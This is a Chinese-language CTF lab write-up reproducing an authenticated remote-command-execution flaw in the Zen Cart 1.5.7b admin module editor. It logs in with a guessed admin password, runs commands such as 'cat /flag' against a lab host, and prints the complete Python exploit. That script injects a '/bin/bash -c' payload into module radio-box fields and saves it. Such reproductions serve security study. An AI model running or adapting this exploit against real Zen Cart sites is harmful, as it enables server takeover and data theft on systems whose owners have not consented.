## 1. 漏洞介绍
Zen Cart 1.5.7b 管理员通过检查HTML radiobox元素（在模块编辑页面内），通过插入命令来执行任意命令。
[阿里云漏洞库](https://avd.aliyun.com/detail?id=AVD-2021-3291)
## 2. 漏洞复现
POC：[GitHub - MucahitSaratar/zencart\_auth\_rce\_poc](https://github.com/MucahitSaratar/zencart_auth_rce_poc)

找后台并以admin登录，经测试得密码为admin888【可以自己去爆破】

![1.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310021647660.png)

登录后访问下面页面【edit】，记住该图，后面要做对比

![2.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310021648404.png)

从GitHub下载 exploit.py 后做个简单修改【登录地址】，修改 `br.open(url+"login.php")` 为 `br.open(url)`，执行脚本时用下面的命令
测试
```python
python poc.py http://eci-2zeepljj7uap05we9cda.cloudeci1.ichunqiu.com/adminlogin/  admin  admin123  "pwd"
```

![3.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310021723052.png)

浏览器再次访问前面的页面，效果如下

![4.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310021724980.png)

**尝试直接获取 flag**【先重置环境，再读取 flag】，也可尝试其他操作—自由发挥……

```python
python poc.py http://eci-2zeepljj7uap05we9cda.cloudeci1.ichunqiu.com/adminlogin/  admin  admin123  "cat /flag"
```

![5.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310021745261.png)

POC.py

```python
#!/usr/bin/python3
import mechanize as mc
import sys
import re
from bs4 import BeautifulSoup as bs
import base64 as B

try:
    url = sys.argv[1]
    assert url[-1] == "/"
    username = sys.argv[2]
    password = sys.argv[3]
    com = sys.argv[4]
except:
    print ("Usage: {sys.argv[0]} http://target.com/zencart/crackXXXXX/ username password command")
    exit(1)

moduls = ["payment","shipping","ordertotal","plugin_manager"] # default

br = mc.Browser()
br.set_handle_robots(False)
br.addheaders=[('User-agent','Chrome')]

br.open(url)

br.select_form("loginForm")
br.form["admin_name"] = username
br.form["admin_pass"] = password
send = br.submit()

mod = moduls[0]
adres = url+"index.php?cmd=modules&set="+mod
kaynak = br.open(adres).read()
adr = re.findall(b'<a href=".{150}', kaynak)
adr2 = []
for i in adr:
    if b"&amp;module=" in i and b"action=remove" not in i:
        adr2.append(i.split(b'<a href="')[1].split(b'"')[0].replace(b"&amp;",b"&").decode())

for ek in adr2:
    kaynak = br.open(ek).read()
    if b"id=\"editButton\">Edit</a>" in kaynak:
        print (f"Target url: {ek}&action=edit")
        br.open(ek+"&action=edit")
        br.select_form("modules")
        form = br.forms()[0]
        liste = b""
        for con in form.controls:
            try:
                deger = br.form.find_control(name=con.name).value
                boyut = len(deger)
                if type(deger) == list:
                    if boyut == 0 or deger[0] == "True" or deger[0] == "False":
                        liste += con.name.encode() + b"=" +  f"True','F'); echo `/bin/bash -c '{com}'`; //".encode() + b"&"
                        print("Payload injected")
                    else:
                        liste +=  con.name.encode() + b"=" + deger[0].encode() + b"&"
                else:
                    liste +=  con.name.encode() + b"=" + deger.encode() + b"&"
            except:
                pass
        print (liste[:-1])
        #br.set_proxies({"http": "localhost:5555"})
        ac = br.open(ek+"&action=save", liste[:-1])
        son = br.open(ek+"&action=edit")
        son = br.open(ek+"&action=edit")
        son = br.open(ek+"&action=edit")
        break
```
